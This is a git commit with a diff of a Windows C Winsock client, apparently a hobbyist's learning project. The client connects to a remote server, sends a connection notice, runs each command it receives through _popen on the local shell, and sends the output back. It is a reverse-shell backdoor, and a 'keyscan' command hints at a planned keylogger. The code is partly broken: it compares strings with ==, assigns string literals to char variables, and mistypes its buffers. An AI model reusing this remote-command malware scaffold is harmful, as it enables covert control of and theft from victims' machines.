54e7253b7e912de5aef200f937f50f7d125235a9
Dawson Hensel <dawsonhensel@gmail.com>
2021-01-07 19:17:58 -0800

    redefined sendData as post func. learned that you can declare function above main with no functinoality, then defin the functinoality after main. added coonnection message to server to initiate message sending. added server_reply checks to check if the string is blank or is keyscan to change client behavior. for some reason. when you read server_reply, it returns number of bytes. if you puts(server_reply) it prints the string sent by server. need to figure out how to properly read server_reply to run custom code when server issues the desired commands.

--- c-sock-server/main.c
+++ c-sock-server/main.c
@@ -3,12 +3,13 @@
 // winsock2.h is the header file to be included for winsock functions
 #include <WinSock2.h>
 #include <WS2tcpip.h>
-#include <stdlib.h>
 
 #define DEFAULT_BUFLEN 128
 
 // ws2_32.lib is the library file to be linked with the program to be able to use winsock functions.
 #pragma comment(lib, "ws2_32.lib")
+
+void post(SOCKET s, char string);
 
 int main(int argc, char* argv[]) {
 
@@ -21,31 +22,31 @@ int main(int argc, char* argv[]) {
 
 	struct sockaddr_in server;
 	// set reply to 128 bytes since we shouldn't ever receive a command longer than that
-	char server_reply[DEFAULT_BUFLEN];
+	char *server_reply[DEFAULT_BUFLEN];
 	int recv_size = DEFAULT_BUFLEN;
 
 	int iResult;
 
-	printf("\nInitialising Winsock...");
+	printf_s("\nInitialising Winsock...");
 
 	// init WinSock2
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsa);
 	if (iResult != NO_ERROR) {
-		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
+		wprintf_s(L"WSAStartup function failed with error: %d\n", iResult);
 		return 1;
 	}
 
-	printf("\nInitialised.");
+	printf_s("\nInitialised.");
 
 	// socket(address_family, socket_type, protocol)
 	// If a value of 0 is specified, the caller does not wish to specify a protocol 
 	// and the service provider will choose the protocol to use.
 	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-		printf("Could not create socket: &d", WSAGetLastError());
+		printf_s("Could not create socket: &d", WSAGetLastError());
 		WSACleanup();
 	}
 
-	printf("\nSocket created.\n");
+	printf_s("\nSocket created.\n");
 
 	// the server ip we want to connect to 
 	// The ip string can be converted to the in_addr structure with the InetPton function
@@ -54,7 +55,7 @@ int main(int argc, char* argv[]) {
 	server.sin_family = AF_INET;
 
 	// htons is done to maintain the arrangement of bytes which is sent in the network(Endianness)
-	server.sin_port = htons(64442);
+	server.sin_port = htons(11111);
 
 	//Connect to remote server
 	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
@@ -65,32 +66,53 @@ int main(int argc, char* argv[]) {
 
 	puts("Connected");
 
+	// send init message
+	char *message = "**Client connected**";
+	if (send(s, message, strlen(message), 0) < 0)
+	{
+		puts("Send failed");
+		return -1;
+	}
+
+	puts("Data sent.\n");
+
 	do {
 		if ((recv_size = recv(s, server_reply, DEFAULT_BUFLEN, 0)) == SOCKET_ERROR)
 		{
 			puts("recv failed");
 		}
-
+	
 		puts("Reply received\n");
 
 		//Add a NULL terminating character to make it a proper string before printing
 		server_reply[recv_size] = '\0';
 		puts(server_reply);
 
-		char   psBuffer[128];
+		char  psBuffer[512];
 		FILE* pPipe;
+		char *cmdFailMsg = "Command failed!";
 
-		/* Run DIR so that it writes its output to a pipe. Open this
-		 * pipe with read text attribute so that we can read it
-		 * like a text file.
-		 */
+		/* SPECIAL COMMANDS CHECK */
+		char BLANK_CMD = "no command supplied.";
+		char KEYSCAN = "spinning up keyscan.";
 
-		if ((pPipe = _popen(server_reply, "rt")) == NULL)
-			exit(1);
+		if (server_reply == "") {
+			post(s, BLANK_CMD);
+			return 0;
+		}
+		if (server_reply == "keyscan") {
+			post(s, KEYSCAN);
+			return 0;
+		}
+
+		// run our remote command on our clients shell
+		if ((pPipe = _popen(server_reply, "r")) == NULL) {
+			printf_s("Error running command!");
+			/*send(s, cmdFailMsg, strlen(cmdFailMsg), 0);*/
+		}
 
 		/* Read pipe until end of file, or an error occurs. */
-
-		while (fgets(psBuffer, 128, pPipe))
+		while (fgets(psBuffer, 512, pPipe))
 		{
 			send(s, psBuffer, strlen(psBuffer), 0);
 		}
@@ -102,7 +124,7 @@ int main(int argc, char* argv[]) {
 		}
 		else
 		{
-			printf("Error: Failed to read the pipe to the end.\n");
+			printf_s("Error: Failed to read the pipe to the end.\n");
 		}
 
 	} while (i == 1);
@@ -110,10 +132,6 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
-int sendData(SOCKET s, char* msg) {
-	if (send(s, msg, strlen(msg), 0) < 0) {
-		puts("Send failed");
-		return 0;
-	}
-	return 1;
+void post(SOCKET s, char string) {
+	send(s, string, strlen(string), 0);
 }
